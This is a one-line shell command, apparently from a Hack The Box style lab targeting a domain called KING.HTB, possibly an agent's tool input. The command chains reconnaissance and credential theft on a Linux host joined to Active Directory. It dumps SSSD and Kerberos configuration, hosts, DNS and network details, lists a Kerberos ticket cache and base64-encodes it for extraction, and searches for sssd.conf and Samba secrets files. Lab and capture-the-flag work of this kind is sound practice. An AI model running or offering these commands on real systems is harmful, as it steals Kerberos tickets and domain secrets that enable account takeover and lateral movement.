list.value: echo "=KDCINFO="; cat /var/lib/sss/pubconf/kdcinfo.KING.HTB; echo "=KRB5_INCLUDE="; cat /var/lib/sss/pubconf/krb5.include.d/*; echo "=HOSTS="; cat /etc/hosts; echo "=RESOLV="; cat /etc/resolv.conf; echo "=INTERFACES="; ip addr; ip route; echo "=KLIST="; KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd klist -v 2>&1; echo "=TICKET_B64="; base64 /tmp/krb5cc_1600801117_Qxs0zd; echo "=SSSD_CONF_FIND="; find /etc -name "sssd*" -o -name "sssd.conf" 2>/dev/null; find /etc/sssd -type f 2>/dev/null; echo "=NET_CONF="; cat /etc/network/interfaces 2>/dev/null; echo "=SAMBA_SECRETS="; find /var/lib/samba -name "secrets*" 2>/dev/null
